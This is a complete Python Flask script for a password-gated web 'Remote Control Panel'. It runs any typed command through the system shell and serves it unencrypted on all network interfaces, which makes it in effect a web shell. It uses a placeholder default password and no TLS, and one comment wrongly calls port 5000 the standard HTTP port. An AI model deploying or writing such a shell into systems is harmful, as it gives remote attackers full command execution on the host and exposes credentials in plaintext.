import os
import sys
import subprocess
from flask import Flask, render_template_string, request, redirect, url_for, session
from flask_session import Session
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['SESSION_TYPE'] = 'filesystem'
Session(app)

# Configuration
PASSWORD_HASH = generate_password_hash("your_secure_password")  # Change this!
PORT = 5000  # Standard HTTP port

HTML_LOGIN = """
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body style="font-family: monospace;">
    <h2>Login</h2>
    <form method="POST">
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Enter">
    </form>
</body>
</html>
"""

HTML_CONTROL = """
<!DOCTYPE html>
<html>
<head><title>Control Panel</title></head>
<body style="font-family: monospace; padding: 20px;">
    <h2>Remote Control Panel</h2>
    <form method="POST">
        <input type="text" name="command" placeholder="Enter command..." style="width: 100%; padding: 8px;">
        <br><br>
        <input type="submit" value="Execute" style="padding: 8px 16px; font-size: 16px;">
    </form>
    {% if output %}
    <pre style="background: #333; color: #0f0; padding: 15px; margin: 20px 0; border-radius: 5px;">{{ output }}</pre>
    {% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if session.get('authenticated'):
        return redirect(url_for('control'))
    if request.method == 'POST':
        password = request.form.get('password')
        if check_password_hash(PASSWORD_HASH, password):
            session['authenticated'] = True
            return redirect(url_for('control'))
    return render_template_string(HTML_LOGIN)

@app.route('/control', methods=['GET', 'POST'])
def control():
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    output = ""
    if request.method == 'POST':
        command = request.form.get('command')
        if command:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                output = f"Command: {command}\n\nSTDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
            except Exception as e:
                output = f"Error: {str(e)}"
    return render_template_string(HTML_CONTROL, output=output)

if __name__ == '__main__':
    # Run in background without SSL
    app.run(host='0.0.0.0', port=PORT, threaded=True)
